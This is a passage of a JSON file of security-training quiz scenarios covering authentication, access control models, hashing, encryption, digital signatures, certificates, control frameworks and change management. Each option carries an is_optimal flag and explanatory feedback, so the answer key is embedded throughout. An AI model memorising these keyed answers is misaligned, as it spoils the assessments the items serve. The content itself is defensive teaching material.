"TOTP authenticator app (Google Authenticator, Authy)", "is_optimal": false, "feedback": "TOTP apps are much better than SMS/email - codes are generated locally, not transmitted. However, they're still phishable via real-time proxy attacks where attackers capture and replay codes. Good but not phishing-resistant."}, {"id": "D", "text": "FIDO2/WebAuthn security keys", "is_optimal": true, "feedback": "Excellent! FIDO2 security keys are phishing-resistant by design. They cryptographically verify the legitimate site's domain - they won't authenticate to a phishing site even if the user is tricked. The key literally cannot be fooled by a fake website."}]}, {"id": "D1R2-DP-005", "title": "Access Control Models - DAC", "situation": "In Google Drive, employees can share their files with anyone they choose - coworkers, external partners, even personal accounts. An employee shared a sensitive client proposal with their personal email.", "question": "What access control model does this represent, and what's the weakness demonstrated?", "options": [{"id": "A", "text": "RBAC - the employee's role allowed them to share files", "is_optimal": false, "feedback": "RBAC assigns permissions based on roles, but the scenario shows the owner deciding who to share with, not role-based automatic permissions. The employee chose to share - that's owner discretion, not role assignment."}, {"id": "B", "text": "DAC - owner controls access, weakness is users may share inappropriately", "is_optimal": true, "feedback": "Correct! Discretionary Access Control lets resource owners control sharing. Google Drive's sharing model is DAC. The weakness: owners might share carelessly or maliciously. There's no system enforcement of data classification or need-to-know."}, {"id": "C", "text": "MAC - the system should have blocked the share based on classification", "is_optimal": false, "feedback": "MAC would have blocked this - that's why it SHOULD have been MAC but wasn't. MAC uses labels (like classification levels) enforced by the system. Google Drive without additional controls is DAC, not MAC. The incident shows DAC's weakness."}, {"id": "D", "text": "ABAC - attributes should have prevented external sharing", "is_optimal": false, "feedback": "ABAC could prevent this if configured, but standard file sharing without attribute-based policies is DAC. ABAC would evaluate conditions (is recipient external? is file classified?) - but that wasn't in place here."}]}], "passing_score": 70, "max_score": 100}, {"id": "D1-REM-003", "domain": 1, "type": "REM", "title": "Cryptography Clinic", "difficulty": "foundational", "role": "security_analyst", "organization": {"name": "TechStart Academy"}, "introduction": "", "decision_points": [{"id": "dp", "title": "Module 1: The Password Problem", "situation": "Your first clinic scenario arrives via helpdesk ticket.\n\n**Ticket #4721:** 'We're building a new student registration portal. The developer asks how to store passwords securely. She's currently using MD5 to hash passwords before storing them. Is this okay?'\n\nSarah looks at you: 'This is foundational. Why do we hash passwords instead of encrypting them? And what's wrong with MD5?'", "question": "What do you tell the developer about MD5 for password storage?", "options": [{"id": "A", "text": "MD5 is cryptographically broken and too fast. Recommend bcrypt or Argon2 with automatic salting and configurable work factor.", "is_optimal": true, "feedback": "Excellent! You've identified both problems: MD5 has collision vulnerabilities AND it's too fast. Modern password hashing algorithms like bcrypt and Argon2 are intentionally slow (preventing brute force) and include built-in salting (preventing rainbow tables). The work factor can be increased over time as hardware improves."}, {"id": "B", "text": "MD5 is fine as long as you add a salt before hashing.", "is_optimal": false, "feedback": "Adding salt to MD5 only prevents rainbow table attacks. MD5's fundamental problems remain: it's collision-vulnerable and extremely fast. GPUs can compute billions of MD5 hashes per second. A salt doesn't slow down targeted brute-force attacks against individual passwords."}, {"id": "C", "text": "Use SHA-256 instead - it's the current hashing standard.", "is_optimal": false, "feedback": "SHA-256 is excellent for data integrity and signatures, but it's still too FAST for password storage. It can compute billions of hashes per second on GPUs. Password hashing requires intentionally slow algorithms to resist brute-force attacks."}, {"id": "D", "text": "Encrypt the passwords with AES-256 instead of hashing them.", "is_optimal": false, "feedback": "Encrypting passwords is wrong for several reasons: you'd need to store the encryption key somewhere (new attack target), anyone with the key could decrypt ALL passwords, and you don't actually need to retrieve passwords - just verify them. Hashing is one-way by design."}]}, {"id": "dp", "title": "Module 1B: Integrity Verification", "situation": "Building on the hashing lesson, Sarah presents another ticket:\n\n**Ticket #4725:** 'The software team distributes training materials as ZIP downloads. They want to help students verify their downloads weren't corrupted or tampered with. What should they provide?'\n\nSarah explains: 'This is a different use case for hashes. Here, speed is actually beneficial since we're checking large files. But we still need collision resistance. What do you recommend?'", "question": "What hash algorithm do you recommend for download verification?", "options": [{"id": "A", "text": "SHA-256 - provides collision resistance for integrity verification and is computationally efficient for large files.", "is_optimal": true, "feedback": "Perfect choice. SHA-256 is ideal for file integrity because: it's collision-resistant (prevents attackers from creating malicious files with matching hashes), fast enough for large files, and widely supported. This is exactly what SHA-256 was designed for."}, {"id": "B", "text": "bcrypt - it's the most secure hashing algorithm available.", "is_optimal": false, "feedback": "bcrypt is designed specifically for passwords, not file integrity. It would be extremely slow for large files (by design!) and doesn't provide benefits for this use case. Using the wrong tool for the job creates problems."}, {"id": "C", "text": "MD5 - it's fast and still commonly used for file checksums.", "is_optimal": false, "feedback": "MD5 is indeed fast and still commonly used for non-security checksums (detecting accidental corruption). However, for TAMPER detection, MD5's collision vulnerabilities are a problem. An attacker could create a malicious file with the same MD5 hash. For security purposes, use SHA-256."}, {"id": "D", "text": "CRC32 - it's the fastest option for file verification.", "is_optimal": false, "feedback": "CRC32 is not a cryptographic hash - it's a checksum designed for error detection only. It has no collision resistance and is trivial to manipulate. Anyone can create a different file with the same CRC32. Never use CRC for security purposes."}]}, {"id": "dp", "title": "Module 2: The Encryption Question", "situation": "Module 2 begins with a database security question.\n\n**Ticket #4730:** 'The student records database contains sensitive information including SSNs and grades. We need to encrypt this data at rest. What encryption should we use?'\n\nSarah adds context: 'This is bulk data encryption - potentially millions of records. Think about what encryption type makes sense for large amounts of data that one system needs to access.'", "question": "What encryption do you recommend for the student records database?", "options": [{"id": "A", "text": "AES-256 symmetric encryption with proper key management stored in a hardware security module (HSM).", "is_optimal": true, "feedback": "Excellent recommendation. AES-256 is the standard for data-at-rest encryption: it's fast enough for large databases, provides strong security, and is FIPS-approved. Storing the encryption key in an HSM protects it from extraction. This is industry best practice."}, {"id": "B", "text": "RSA-4096 asymmetric encryption for maximum security.", "is_optimal": false, "feedback": "RSA is asymmetric encryption - designed for small amounts of data like keys and signatures. Encrypting a database with RSA would be extremely slow (thousands of times slower than AES) and isn't how RSA is meant to be used. RSA typically encrypts symmetric keys, not bulk data."}, {"id": "C", "text": "3DES encryption since it's been used reliably for decades.", "is_optimal": false, "feedback": "3DES is deprecated and should not be used for new implementations. Its 64-bit block size makes it vulnerable to Sweet32 birthday attacks when encrypting large amounts of data - exactly what a database does. NIST withdrew 3DES approval in 2023. Use AES."}, {"id": "D", "text": "SHA-256 to secure the database contents.", "is_optimal": false, "feedback": "SHA-256 is a hash function, not encryption. Hashing is one-way - you couldn't retrieve the data! Encryption must be reversible (two-way) so authorized users can access the original data. This is a fundamental distinction."}]}, {"id": "dp", "title": "Module 3: Digital Signatures", "situation": "Module 3 introduces digital signatures.\n\n**Ticket #4735:** 'The CEO needs to digitally sign important announcements to prove they're authentic and haven't been modified. How do digital signatures work, and what do we need to set up?'\n\nSarah explains: 'This is where asymmetric cryptography shines. The CEO will use her private key to sign, and anyone can use her public key to verify. Walk me through it.'", "question": "How do you explain the digital signature process to the CEO's office?", "options": [{"id": "A", "text": "The document is hashed, then the hash is encrypted with your private key. Anyone can verify by decrypting with your public key and comparing hashes. This proves authenticity and integrity.", "is_optimal": true, "feedback": "Perfect explanation! You've correctly described how digital signatures work. The private key creates the signature (only the CEO has it), and the public key verifies it (anyone can check). The hash ensures the document wasn't modified. This provides authentication, integrity, and non-repudiation."}, {"id": "B", "text": "Encrypt the entire document with the CEO's private key so only authorized people can read it.", "is_optimal": false, "feedback": "This confuses signing with encryption. Encrypting with a private key doesn't hide the content - anyone with the public key could decrypt it. Also, asymmetric encryption of entire documents is impractical. Digital signatures prove authenticity, not confidentiality."}, {"id": "C", "text": "Create a hash of the document and publish it alongside the announcement.", "is_optimal": false, "feedback": "A hash alone proves integrity (document wasn't modified) but NOT authenticity. Anyone could create a hash. Without the private key signature, there's no proof the CEO created it. Digital signatures combine hashing WITH asymmetric cryptography."}, {"id": "D", "text": "Use the CEO's public key to encrypt the document so it can be verified.", "is_optimal": false, "feedback": "You've got the keys reversed. Signing uses the PRIVATE key (proves identity). If you encrypted with the public key, anyone could do it - it wouldn't prove the CEO created it. The private key is secret, which is what makes the signature meaningful."}]}, {"id": "dp", "title": "Module 4: Certificate Fundamentals", "situation": "Module 4 tackles certificates.\n\n**Ticket #4740:** 'A user reported a certificate warning when accessing our learning portal. The browser says the certificate is untrusted. But we have a valid certificate - why would browsers not trust it?'\n\nSarah asks: 'Before we troubleshoot, let's make sure you understand HOW certificate trust works. What makes a browser trust a certificate?'", "question": "After investigation, you find the server is only sending the end-entity certificate, not the intermediate CA certificate. What's the fix?", "options": [{"id": "A", "text": "Configure the server to send the full certificate chain including the intermediate CA certificate. Browsers need the complete chain to verify trust.", "is_optimal": true, "feedback": "Correct diagnosis and fix. Browsers have root CA certificates in their trust stores, but intermediate CAs must be provided by the server. Without the intermediate, browsers can't build the chain from your certificate to a trusted root. Always deploy the full chain."}, {"id": "B", "text": "Add the root CA certificate to the server configuration since browsers need to see it.", "is_optimal": false, "feedback": "You're close, but browsers already have root CA certificates in their trust stores. Sending the root is unnecessary (and slightly wasteful). What browsers need is the INTERMEDIATE certificate that connects your certificate to the root they already have."}, {"id": "C", "text": "The certificate must be corrupt. Request a new certificate from the CA.", "is_optimal": false, "feedback": "The certificate itself is probably fine - the issue is missing chain certificates in the server configuration. Before requesting new certificates, always check the chain configuration. Most 'untrusted certificate' errors are configuration issues, not certificate problems."}, {"id": "D", "text": "Tell users to click through the warning since the certificate is valid.", "is_optimal": false, "feedback": "Never train users to ignore security warnings! This creates terrible security habits and may indicate a real issue. Additionally, browsers are increasingly preventing click-through for certificate errors. Fix the configuration properly."}]}], "passing_score": 70, "max_score": 100}, {"id": "D1-SIM-001", "domain": 1, "type": "SIM", "title": "Security Controls Implementation", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "Pinnacle Insurance Group"}, "introduction": "You're a security analyst at Pinnacle Insurance Group, reporting to the newly hired CISO. A regulatory audit revealed that while the company has various security measures in place, they lack a structured controls framework. Controls are inconsistent across departments, and there's no clear mapping between security measures and the risks they address. Your task is to help design and implement a comprehensive security controls program that addresses regulatory requirements and protects the business.", "decision_points": [{"id": "dp1", "title": "Control Categories Assessment", "situation": "The CISO asks you to assess the current state of security controls. You find:\n\n- **IT Department**: Firewalls, antivirus, encryption tools deployed\n- **HR Department**: Background checks performed, security mentioned in employee handbook\n- **Facilities**: Badge readers at main entrance, security cameras in lobby\n- **Security Team**: Incident response procedures documented but not tested\n\nThe CISO asks: 'How would you categorize what we have, and what's missing?'\n\nHow do you categorize these existing controls?", "question": "What would you do?", "options": [{"id": "a", "text": "All controls are technical because they protect against cyber threats", "is_optimal": false, "feedback": "Incorrect. Background checks are managerial/administrative controls (HR policy). Badge readers and cameras are physical controls. Only firewalls, antivirus, and encryption are technical controls. Security controls span multiple categories beyond just technology."}, {"id": "b", "text": "Technical (firewalls, AV, encryption), Managerial (background checks, handbook), Physical (badges, cameras), Operational (IR procedures)", "is_optimal": true, "feedback": "Excellent categorization! Technical controls are implemented through technology. Managerial/administrative controls are policies and procedures from management. Physical controls protect physical assets and premises. Operational controls are day-to-day security practices. You've correctly identified all four categories."}, {"id": "c", "text": "Preventive controls (firewalls, badges) and Detective controls (antivirus, cameras)", "is_optimal": false, "feedback": "You're describing control types (preventive, detective), not categories. While this classification is also valid, the CISO asked about categories. Firewalls are technical controls that are preventive. Cameras are physical controls that are detective. Categories and types are different classification schemes."}, {"id": "d", "text": "Hardware controls and software controls", "is_optimal": false, "feedback": "This is too narrow a classification. It only addresses technical controls and misses managerial, physical, and operational categories entirely. Background checks aren't hardware or software. Security cameras are hardware but they're physical controls, not IT hardware controls."}]}, {"id": "dp2", "title": "Control Types Selection", "situation": "The CISO wants to address a specific risk: unauthorized access to customer health information used for life insurance underwriting. This data is stored in a database and accessed by underwriters.\n\nShe asks: 'What types of controls should we implement? I want to prevent breaches, detect if something goes wrong, and be able to respond.'\n\nWhat control types do you recommend?", "question": "What would you do?", "options": [{"id": "a", "text": "Focus on preventive controls only - if we prevent all breaches, we don't need detection or response", "is_optimal": false, "feedback": "Prevention alone is insufficient. No preventive control is 100% effective. Without detective controls, you won't know when prevention fails. Without corrective controls, you can't recover. Defense in depth requires multiple control types working together."}, {"id": "b", "text": "Layered approach: Preventive (access controls, encryption), Detective (logging, monitoring, DLP alerts), Corrective (incident response, backup restoration)", "is_optimal": true, "feedback": "Excellent approach! Preventive controls stop unauthorized access before it happens. Detective controls identify when prevention fails. Corrective controls enable recovery and remediation. This defense-in-depth approach ensures security even when individual controls fail."}, {"id": "c", "text": "Detective controls are most important - we need to catch bad actors in the act", "is_optimal": false, "feedback": "Detective controls are important but catching breaches in progress still means damage occurs. Prevention reduces the number of incidents to detect. Correction enables recovery. Prioritizing detection alone means accepting preventable incidents."}, {"id": "d", "text": "Implement compensating controls since our legacy database can't support modern security features", "is_optimal": false, "feedback": "Compensating controls are valuable when primary controls can't be implemented, but you haven't established that limitation yet. Start with the standard control types. If technical constraints prevent primary controls, then design compensating controls to address the gap."}]}, {"id": "dp3", "title": "Technical Controls Implementation", "situation": "You're implementing technical controls for the health information database. The database team presents options:\n\n**Option A**: Implement transparent database encryption (TDE) for data at rest\n**Option B**: Implement application-level encryption where the app encrypts before storing\n**Option C**: Implement network encryption only (TLS) since data is encrypted in transit\n**Option D**: Implement all three layers\n\nWhat technical control approach do you recommend?", "question": "What would you do?", "options": [{"id": "a", "text": "Option C - Network encryption is sufficient since we control our internal network", "is_optimal": false, "feedback": "Network encryption protects data in transit but not at rest. If someone accesses the database directly (DBA, attacker with DB access, stolen backup), data is exposed. Internal networks aren't inherently trusted - insider threats and lateral movement are real risks."}, {"id": "b", "text": "Option A - TDE is easiest to implement and protects data at rest without application changes", "is_optimal": false, "feedback": "TDE provides good protection at rest with minimal application impact. However, it doesn't protect against privileged database users who can read decrypted data. For highly sensitive health information, consider whether TDE alone is sufficient or if application-level encryption adds value."}, {"id": "c", "text": "Option D - Defense in depth with all three layers provides comprehensive protection", "is_optimal": true, "feedback": "Excellent! Defense in depth applies multiple controls so that failure of one doesn't mean complete compromise. TDE protects against storage theft. Application encryption protects against privileged DB access. Network encryption protects against interception. Each layer addresses different threats."}, {"id": "d", "text": "Option B - Application-level encryption is strongest since keys aren't accessible to DBAs", "is_optimal": false, "feedback": "Application-level encryption provides strong protection but is complex to implement correctly. Key management becomes the application's responsibility. Without TDE, someone with storage access sees encrypted blobs but backup management is complicated. Without TLS, data could be intercepted in transit."}]}, {"id": "dp4", "title": "Physical Controls Gap", "situation": "During your assessment, you visit the regional offices. You find:\n\n- **Main office**: Badge readers, security guard, cameras, server room with biometric lock\n- **Regional office A**: Badge reader at front door only; server closet uses regular key lock\n- **Regional office B**: No badge reader; receptionist buzzes people in; network equipment in unlocked closet\n\nRegional offices process the same sensitive health data as headquarters.\n\nHow do you address this physical security gap?", "question": "What would you do?", "options": [{"id": "a", "text": "Regional offices are lower risk because they're smaller; current controls are adequate", "is_optimal": false, "feedback": "Size doesn't determine risk - data sensitivity does. If regional offices process the same health data, they need equivalent protection. Attackers may specifically target regional offices knowing they have weaker security. This is a significant compliance gap."}, {"id": "b", "text": "Implement baseline physical controls at all locations: badge access, secured network equipment, and camera coverage", "is_optimal": true, "feedback": "Correct approach! Establish baseline physical security standards that apply regardless of location size. Badge access provides access control and audit trail. Secured network equipment prevents unauthorized physical access to infrastructure. Cameras provide deterrent and detective capability."}, {"id": "c", "text": "Move all sensitive data processing to headquarters; regional offices become thin clients", "is_optimal": false, "feedback": "Centralizing processing could work but is a major architectural change that may not be operationally feasible. It doesn't address the physical security gap for network equipment that still exists at regional offices. This is avoiding the problem rather than solving it."}, {"id": "d", "text": "Implement compensating controls: increase cyber monitoring for regional office networks", "is_optimal": false, "feedback": "Technical monitoring doesn't compensate for physical security gaps. If someone can physically access network equipment, they can tap network cables, install rogue devices, or steal equipment. Compensating controls should address the same risk - here, that's physical access control."}]}, {"id": "dp5", "title": "Managerial Controls Development", "situation": "The CISO wants to strengthen managerial controls. Currently, the company has:\n\n- Basic security policy (last updated 3 years ago)\n- Employee handbook mentions security responsibilities\n- No formal security awareness program\n- Background checks only for IT staff\n\nWhat managerial controls should be prioritized?", "question": "What would you do?", "options": [{"id": "a", "text": "Focus on updating the security policy first; everything flows from policy", "is_optimal": false, "feedback": "Policy is important but a policy alone doesn't create security. Without training, employees don't know the policy. Without background checks, you may hire risks. Policy should be part of a comprehensive managerial controls program, not the only focus."}, {"id": "b", "text": "Comprehensive approach: Update policies, implement security awareness training, expand background checks to all roles handling sensitive data", "is_optimal": true, "feedback": "Excellent! Managerial controls work together. Policies establish expectations. Training ensures employees understand and can follow policies. Background checks reduce insider threat risk. Together, they create a security-aware workforce with appropriate screening."}, {"id": "c", "text": "Security awareness training is most important since employees are the weakest link", "is_optimal": false, "feedback": "Training is critical but needs policy foundation. What do you train on without documented policies? Background checks also matter - training doesn't address intentional insider threats. A comprehensive approach addresses multiple human-factor risks."}, {"id": "d", "text": "Background checks for all employees should be the priority given the sensitive health data", "is_optimal": false, "feedback": "Background checks are important for sensitive data roles but don't address ongoing behavior. Employees need training to handle data properly. Policies define what's expected. A one-time check without ongoing controls is insufficient."}]}], "passing_score": 70, "max_score": 100}, {"id": "D1-SIM-002", "domain": 1, "type": "SIM", "title": "Security Concepts in Practice", "difficulty": "intermediate", "role": "Security Engineer", "organization": {"name": "TechForward Solutions"}, "introduction": "You're a security engineer at TechForward Solutions, a fast-growing SaaS company. A major customer's security audit revealed gaps in fundamental security concepts and change management. The CTO has asked you to help remediate these findings while keeping the development teams productive. You'll need to apply core security concepts including CIA triad, AAA, least privilege, and implement proper change management without creating bottlenecks.", "decision_points": [{"id": "dp1", "title": "CIA Triad Application", "situation": "The customer audit finding states: 'Security decisions lack clear framework for prioritization.'\n\nThe CTO asks: 'When we make security decisions, how do we determine what's most important? Different teams prioritize different things.'\n\nYou need to establish a framework for security decision-making. A current example: the development team wants to give all developers read access to production databases for debugging, which operations opposes.\n\nHow do you frame security priorities?", "question": "What would you do?", "options": [{"id": "a", "text": "Security always means preventing unauthorized access - deny the developer access request", "is_optimal": false, "feedback": "Security isn't just about preventing access. The CIA triad provides a balanced framework: Confidentiality (protecting sensitive data), Integrity (ensuring accuracy), and Availability (ensuring access when needed). Blanket denial doesn't address legitimate debugging needs."}, {"id": "b", "text": "Use CIA triad: evaluate how the request impacts Confidentiality, Integrity, and Availability, then find solution that balances all three", "is_optimal": true, "feedback": "Excellent! The CIA triad provides a balanced framework. For this request: Confidentiality risk (developers seeing customer data), Integrity risk (potential accidental changes), Availability benefit (faster debugging). A balanced solution might be read-only access to anonymized/masked data, or access to non-production replica."}, {"id": "c", "text": "Availability is most important for a software company - approve access to keep developers productive", "is_optimal": false, "feedback": "Availability matters but so do confidentiality and integrity. Customer data confidentiality is essential for trust and compliance. Data integrity is critical for a software company's reputation. Prioritizing one element of CIA over others creates imbalanced security."}, {"id": "d", "text": "Let the CTO decide based on business priorities", "is_optimal": false, "feedback": "Security should inform business decisions, not abdicate them. Providing the CIA framework helps the CTO make an informed decision. Simply deferring without guidance doesn't address the underlying need for a decision-making framework."}]}, {"id": "dp2", "title": "Authentication Implementation", "situation": "The audit found: 'Authentication mechanisms are inconsistent across applications.'\n\nCurrently:\n- Main SaaS platform: Username/password only\n- Admin portal: Username/password + email OTP\n- Internal tools: Single sign-on (SSO) with company IdP\n- API access: API keys only\n\nYou need to recommend authentication improvements.\n\nWhat approach do you take?", "question": "What would you do?", "options": [{"id": "a", "text": "Require MFA everywhere - it's the most secure option", "is_optimal": false, "feedback": "MFA is important but 'everywhere' may include scenarios where it's impractical (API automated calls) or where risk doesn't justify friction (low-sensitivity internal tools). Authentication should be risk-based, with stronger authentication for higher-risk access."}, {"id": "b", "text": "Implement risk-based authentication: MFA for high-value access (customer data, admin functions), SSO for internal, strong API auth for machine access", "is_optimal": true, "feedback": "Excellent! Authentication should match risk level. Customer-facing and admin access warrant MFA. Internal tools can use SSO (already authenticated to IdP). API access needs appropriate machine authentication (OAuth, certificates) not just static keys. This balances security with usability."}, {"id": "c", "text": "Standardize on SSO for everything - it's most convenient and already in place", "is_optimal": false, "feedback": "SSO improves convenience and can improve security, but external users (customers) may not be able to use your internal IdP. API access can't practically use interactive SSO. SSO is good for employees but doesn't solve all authentication scenarios."}, {"id": "d", "text": "Keep current setup but add logging - we need visibility before changing authentication", "is_optimal": false, "feedback": "Logging is important (that's Accounting in AAA), but it doesn't address the authentication weaknesses identified. Password-only access to customer data is a significant risk that logging alone doesn't mitigate. Authentication improvements shouldn't wait for logging."}]}, {"id": "dp3", "title": "Authorization and Least Privilege", "situation": "The audit found: 'Access permissions are overly broad. Many users have administrative access they don't need.'\n\nInvestigation reveals:\n- All developers have admin access to all development environments\n- Most support staff have access to all customer tenants\n- Service accounts run with administrative privileges\n- No regular access reviews conducted\n\nHow do you address the authorization issues?", "question": "What would you do?", "options": [{"id": "a", "text": "Immediately revoke all admin access and have users request what they need", "is_optimal": false, "feedback": "Sudden broad revocation will disrupt operations. Users won't know what they need until they try to work. This creates chaos and may lead to emergency re-grants without proper evaluation. Transition to least privilege should be planned, not abrupt."}, {"id": "b", "text": "Implement least privilege: analyze actual access needs, implement RBAC, scope service accounts, and establish regular access reviews", "is_optimal": true, "feedback": "Excellent! Least privilege should be implemented systematically. Analyze what access users actually need. Implement role-based access control (RBAC) based on job functions. Scope service accounts to minimum required permissions. Regular reviews ensure permissions stay appropriate."}, {"id": "c", "text": "Focus on service accounts first since they're the highest risk", "is_optimal": false, "feedback": "Service accounts are high risk due to automation and often excessive privileges, but human admin access also presents significant risk. The audit found issues across all categories. A comprehensive approach addresses all authorization issues, though prioritization is reasonable."}, {"id": "d", "text": "Implement logging first to understand who's using what access", "is_optimal": false, "feedback": "Understanding current access usage is valuable, but logging alone doesn't fix the authorization issues. Known over-permissioning should be addressed. Use logging to inform the transition, but start reducing unnecessary access in parallel."}]}, {"id": "dp4", "title": "Change Management Foundation", "situation": "The audit's most significant finding: 'No formal change management process exists. Changes to production are made without documentation, testing requirements, or approval.'\n\nCurrently, developers can push code directly to production through CI/CD. There have been multiple incidents traced to untested changes.\n\nThe development team lead says: 'We move fast. Formal change management will kill our velocity.'\n\nHow do you implement change management without destroying productivity?", "question": "What would you do?", "options": [{"id": "a", "text": "Implement full CAB (Change Advisory Board) review for all changes", "is_optimal": false, "feedback": "Full CAB for all changes is overkill for a software company and will indeed kill velocity. CAB review makes sense for significant changes but not routine deployments. Modern change management uses risk-based approaches with different processes for different change types."}, {"id": "b", "text": "Risk-based change management: automated testing gates in CI/CD for standard changes, additional review for significant changes, emergency process for urgent fixes", "is_optimal": true, "feedback": "Excellent! Risk-based change management balances control with velocity. Standard changes (routine deployments) go through automated testing and code review. Significant changes (architecture, security) need additional review. Emergency changes have expedited process with post-implementation review. This enables speed with appropriate controls."}, {"id": "c", "text": "Keep current process but add documentation requirements", "is_optimal": false, "feedback": "Documentation without gates doesn't prevent bad changes. If developers can still push untested code to production, documentation just records the damage after the fact. Change management needs controls, not just paperwork."}, {"id": "d", "text": "Separate production access from developers - operations team deploys all changes", "is_optimal": false, "feedback": "Separation of duties is valuable but creating a deployment bottleneck isn't the answer. DevOps and CI/CD exist to enable rapid, safe deployment. The solution is automated controls in the pipeline, not manual handoffs that create delays."}]}, {"id": "dp5", "title": "Non-Repudiation Implementation", "situation": "During a customer dispute, you need to prove that a specific user made a specific change that affected their data. Current logging shows an action occurred but not definitively who did it (shared service account was used).\n\nThe legal team asks: 'How do we prove who did what? This is a significant legal exposure.'\n\nHow do you address non-repudiation?", "question": "What would you do?", "options": [{"id": "a", "text": "Implement IP address logging to track who made changes", "is_optimal": false, "feedback": "IP addresses help but don't provide non-repudiation. Multiple users share IPs (NAT, VPN). IPs can be spoofed. Users move between IPs. You need identity-linked authentication that can't be denied - individual accounts with strong authentication."}, {"id": "b", "text": "Implement individual accountability: eliminate shared accounts, require individual authentication, log user identity with all actions, consider digital signatures for critical actions", "is_optimal": true, "feedback": "Excellent! Non-repudiation requires individual accountability. Eliminate shared accounts so each action ties to a specific person. Strong authentication makes identity verification reliable. Comprehensive logging records who did what. Digital signatures provide cryptographic proof for critical actions."}, {"id": "c", "text": "Add manager approval to all changes so there's a witness", "is_optimal": false, "feedback": "Approval provides authorization but not attribution for who actually made the change. If a shared account is used, approval doesn't identify the person who clicked the button. Non-repudiation needs individual identity tied to actions."}, {"id": "d", "text": "Implement video monitoring of user workstations", "is_optimal": false, "feedback": "Video monitoring is invasive, creates privacy issues, and doesn't scale for remote workers. Technical controls (individual accounts, logging) provide better non-repudiation without the privacy and practicality concerns."}]}], "passing_score": 70, "max_score": 100}, {"id": "D1-SIM-003", "domain": 1, "type": "SIM", "title": "The Encryption Emergency", "difficulty": "intermediate", "role": "security_engineer", "organization": {"name": "Quantum Financial Services"}, "introduction": "Quantum Financial Services has discovered that their primary SSL/TLS certificate for their customer-facing banking portal expires in 72 hours. Worse, the security team has found that several internal systems are still using deprecated encryption algorithms (3DES, SHA-1), and the certificate authority they've been using has announced it's being distrusted by major browsers next month. You must orchestrate an emergency cryptographic modernization while maintaining service availability.", "decision_points": [{"id": "D1S3-DP-001", "title": "Emergency Response Priority", "situation": "You've just been briefed on the situation. The CISO wants your immediate assessment and action plan. You have 72 hours before the main certificate expires, but multiple cryptographic issues need attention.", "question": "What should be your FIRST priority action?", "options": [{"id": "A", "text": "Immediately purchase and install a new wildcard certificate from a trusted CA for the customer portal", "is_optimal": true, "feedback": "Correct. The 72-hour expiring certificate for customer-facing services is the most critical and time-sensitive issue. Certificate expiration would cause immediate service disruption and security warnings for all 500,000 customers. While other issues are important, they don't have the same immediate deadline."}, {"id": "B", "text": "Focus on upgrading all deprecated algorithms (3DES, SHA-1) since these are active security vulnerabilities", "is_optimal": false, "feedback": "While deprecated algorithms are security concerns, they're not causing immediate service disruption. The expiring certificate will break the customer portal in 72 hours - that's your most urgent deadline. Algorithm upgrades can be planned more carefully."}, {"id": "C", "text": "Set up a new internal Certificate Authority to handle all certificates going forward", "is_optimal": false, "feedback": "Internal CAs can't be used for public-facing services - browsers won't trust them. Your customer portal needs a certificate from a publicly trusted CA. Additionally, setting up a proper internal CA takes time you don't have."}, {"id": "D", "text": "Disable HTTPS temporarily and run the portal on HTTP until the certificate situation is resolved", "is_optimal": false, "feedback": "This would be a massive security and compliance violation for a financial institution. Running a banking portal without encryption exposes all customer credentials, session tokens, and financial data. PCI DSS absolutely prohibits this, and you'd face immediate regulatory action."}]}, {"id": "D1S3-DP-002", "title": "Certificate Type Selection", "situation": "You're procuring a new certificate from DigiCert, a well-trusted CA. You need to decide what type of certificate to order for the customer-facing infrastructure.", "question": "Which certificate type is MOST appropriate for Quantum Financial's customer portal?", "options": [{"id": "A", "text": "Domain Validation (DV) wildcard certificate - fastest issuance, covers all subdomains", "is_optimal": false, "feedback": "DV certificates only verify domain ownership, not organization identity. For a financial institution handling sensitive customer data, this provides minimal trust assurance. Customers and regulators expect higher validation for banking services."}, {"id": "B", "text": "Extended Validation (EV) certificate for the main domain only", "is_optimal": false, "feedback": "EV provides the highest validation level and was traditionally shown with green bar indicators. However, a single-domain EV won't cover your subdomains (portal, api, www), requiring multiple certificates or leaving services unprotected."}, {"id": "C", "text": "Organization Validation (OV) wildcard certificate with specific SANs for critical subdomains", "is_optimal": true, "feedback": "Excellent choice. OV certificates verify organizational identity (appropriate for financial services), wildcards cover subdomains efficiently, and adding specific SANs ensures critical services are explicitly covered. This balances security assurance, coverage, and manageability."}, {"id": "D", "text": "Self-signed certificate as a temporary measure while proper certificates are obtained", "is_optimal": false, "feedback": "Self-signed certificates would trigger security warnings in all browsers, alarming customers and likely violating PCI DSS requirements for trusted certificates. This is not acceptable for a production financial services portal."}]}, {"id": "D1S3-DP-003", "title": "Key Generation Security", "situation": "The new certificate requires generating a new key pair. Your team asks where and how the private key should be generated.", "question": "What is the MOST secure method for generating the private key for this critical certificate?", "options": [{"id": "A", "text": "Generate on the web server where it will be used, then back up to network storage", "is_optimal": false, "feedback": "Generating keys on production servers is risky - the server may be compromised, and the key is immediately exposed to potential attacks. Backing up private keys to network storage creates additional exposure points and violates key management best practices."}, {"id": "B", "text": "Use the CA's key generation service - they generate it and send both certificate and key", "is_optimal": false, "feedback": "Never let a third party generate your private keys. The fundamental principle of PKI is that private keys should never leave the entity that owns them. If the CA generates your key, they have a copy, which defeats the purpose of asymmetric cryptography."}, {"id": "C", "text": "Generate on an air-gapped workstation, create CSR, securely transfer to HSM after certificate issuance", "is_optimal": false, "feedback": "Air-gapped generation is good practice, but the key should ideally be generated directly in the HSM and never exist outside it. Transferring keys, even securely, creates a window of exposure and complexity."}, {"id": "D", "text": "Generate the key pair directly within the Hardware Security Module (HSM), export only the CSR", "is_optimal": true, "feedback": "Perfect. HSM-generated keys never exist outside the tamper-resistant hardware. Only the Certificate Signing Request (CSR) containing the public key is exported to send to the CA. This provides the highest level of private key protection and meets compliance requirements."}]}, {"id": "D1S3-DP-004", "title": "Algorithm Selection for New Certificate", "situation": "When generating the CSR, you need to specify the key algorithm and size. The certificate will protect financial transactions for the next year.", "question": "Which key algorithm and parameters should you select for the new certificate?", "options": [{"id": "A", "text": "RSA 2048-bit with SHA-256 signature", "is_optimal": false, "feedback": "RSA 2048 with SHA-256 meets current minimum standards and is widely compatible. However, for a financial institution looking forward, this represents the floor rather than a strong security posture. NIST recommends transitioning to stronger options."}, {"id": "B", "text": "RSA 4096-bit with SHA-384 signature", "is_optimal": true, "feedback": "Excellent choice. RSA 4096 provides strong security margin for the certificate's lifetime and beyond. SHA-384 offers stronger collision resistance than SHA-256. This combination offers excellent compatibility while exceeding minimum requirements - appropriate for financial services."}, {"id": "C", "text": "ECDSA P-256 (secp256r1) with SHA-256 signature", "is_optimal": false, "feedback": "ECDSA P-256 provides 